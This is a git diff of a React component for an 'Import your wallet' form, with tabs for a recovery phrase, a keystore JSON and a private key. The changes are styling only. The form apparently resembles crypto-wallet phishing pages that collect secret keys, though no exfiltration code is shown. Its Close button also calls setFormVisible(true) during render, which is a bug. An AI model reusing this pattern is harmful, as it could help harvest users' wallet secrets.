@@ -27,28 +27,40 @@ function Form() {
 
   return (
     <div>
-      <div className=" mt-5 w-[80%] rounded bg-white p-4 shadow-lg md:w-[70%]">
+      <div className=" mx-auto mt-16 w-[80%] rounded bg-white p-8 shadow-lg md:w-[70%]">
         <p className="flex gap-4 p-4">
           <span>
             <img src="" alt="" />
           </span>
           <span>Import your wallet</span>
         </p>
-        <p className="flex gap-8 border border-b-gray-200 text-xl font-bold">
+        <p className="flex gap-8 border-b border-b-gray-200 text-xl font-bold">
           <span
-            className={`${active === 1 ? "border border-b-blue-400" : ""}`}
+            className={`${
+              active === 1
+                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
+                : ""
+            }`}
             onClick={() => setActive(1)}
           >
             Phrase
           </span>
           <span
-            className={`${active === 2 ? "border border-b-blue-400" : ""}`}
+            className={`${
+              active === 2
+                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
+                : ""
+            }`}
             onClick={() => setActive(2)}
           >
             Keystore Json
           </span>
           <span
-            className={`${active === 3 ? "border border-b-blue-400" : ""}`}
+            className={`${
+              active === 3
+                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
+                : ""
+            }`}
             onClick={() => setActive(3)}
           >
             Private Key
@@ -109,15 +121,15 @@ function Form() {
               </span>
             </>
           )}
-          <div className="flex gap-4">
+          <div className="mt-5 flex gap-4">
             <input
               type="submit"
               value="Connect"
-              className="mx-auto mt-5 block w-[70%] cursor-pointer rounded bg-blue-500 px-[30px] py-[15px] text-center text-white md:mt-5"
+              className="mx-auto block w-[70%] cursor-pointer rounded bg-blue-500 px-[30px] py-[15px] text-center text-white "
             />
             <p
               onClick={setFormVisible(true)}
-              className="cursor-pointer bg-red-500 px-2 py-4 text-white "
+              className=" w-[30%] cursor-pointer rounded bg-red-500 px-4 pt-3 text-center text-white "
             >
               Close
             </p>
